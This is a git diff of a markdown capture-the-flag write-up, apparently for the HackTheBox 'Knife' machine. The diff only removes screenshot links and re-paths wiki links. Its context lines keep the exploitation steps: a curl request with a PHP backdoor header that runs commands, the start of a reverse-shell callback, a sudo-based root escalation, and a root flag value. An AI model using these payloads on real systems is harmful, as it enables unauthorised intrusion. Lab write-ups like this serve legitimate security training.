@@ -80,7 +80,6 @@ sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
 
 The scan returned TCP 22 and TCP 80.
 
-![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
 
 SCREENSHOT: The full TCP scan identifies SSH and HTTP as the only open services.
 
@@ -97,7 +96,6 @@ sudo nmap -Pn -n -sC -sV --version-light -p "$OpenPorts" \
   -oA "$BoxDir/nmap/services" "$BoxIP"
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)
 
 SCREENSHOT: The service scan confirms OpenSSH 8.2p1 and Apache 2.4.41 with the application title.
 
@@ -124,7 +122,6 @@ Server: Apache/2.4.41 (Ubuntu)
 X-Powered-By: PHP/8.1.0-dev
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/3.gobuster.png>)
 
 SCREENSHOT: The HTTP response discloses the backdoored PHP development version.
 
@@ -143,7 +140,6 @@ curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
 
 The response returned `uid=1000(james)`, confirming command execution as the local user `james`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Knife/screenshots/4.backdoor-rce.png>)
 
 SCREENSHOT: The misspelled header executes `id` and returns the `james` identity.
 
@@ -171,7 +167,6 @@ curl --max-time 10 -fsS \
 
 The callback arrived as `james`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Knife/screenshots/5.reverse-shell.png>)
 
 SCREENSHOT: Netcat receives the callback from the target as `james`.
 
@@ -203,7 +198,6 @@ pwd
 
 The shell remained `james` on host `knife`.
 
-![](<file:///home/kali/Platforms/HackTheBox/Knife/screenshots/6.stable-shell.png>)
 
 SCREENSHOT: The Python PTY and terminal recovery sequence produces a usable `james` shell.
 
@@ -229,7 +223,6 @@ User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Mirai/screenshots/7.sudo-l.png>)
 
 SCREENSHOT: `sudo -l` grants `james` passwordless execution of `/usr/bin/knife` as root.
 
@@ -254,9 +247,7 @@ hostname
 
 The shell returned UID 0 as `root` on `knife`.
 
-![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/8.root-shell.png>)
 
-![](<file:///home/kali/Platforms/HackTheBox/Knife/screenshots/9.root-proof.png>)
 
 SCREENSHOT: The exact sudo-approved Knife command opens a root shell and the private proof frame confirms UID 0.
 
@@ -469,12 +460,12 @@ loot flag root a8e2895f58ad8e18ac7af2080764fdddloot
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Linux - Service Scan]]
-- [[RUNBOOK V2/Linux - Web Enum]]
-- [[RUNBOOK V2/Linux - Shell Stabilise]]
-- [[RUNBOOK V2/Linux - Local Enum]]
-- [[RUNBOOK V2/Linux - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
+- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
+- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Clean Down]]
 
 ## Why this matters for OSCP
 
